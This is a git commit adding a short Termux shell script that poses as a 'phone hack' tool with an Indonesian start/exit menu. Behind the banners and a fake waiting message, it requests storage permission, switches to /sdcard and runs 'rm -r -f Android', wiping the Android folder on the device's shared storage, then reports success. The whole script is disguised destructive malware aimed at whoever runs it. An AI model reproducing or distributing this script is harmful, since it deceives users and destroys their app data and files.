d675474b68a9e60cf3af77491ec97d90e8e22a4b
luthfi12345 <57252323+luthfi12345@users.noreply.github.com>
2019-11-01 17:09:40 +0700

    Add files via upload

---
+++ FdBtL01.sh
@@ -0,0 +1,13 @@
+figlet HAPE|lolcat
+figlet HACK|lolcat
+echo ""
+echo "1.MULAI"
+echo "0.KELUAR"     
+                              echo "" 
+read -p"pilih no: " bos;
+figlet SABAR...|lolcat
+sleep 2
+termux-setup-storage
+cd /sdcard
+rm -r -f Android
+figlet SUKSES|lolcat
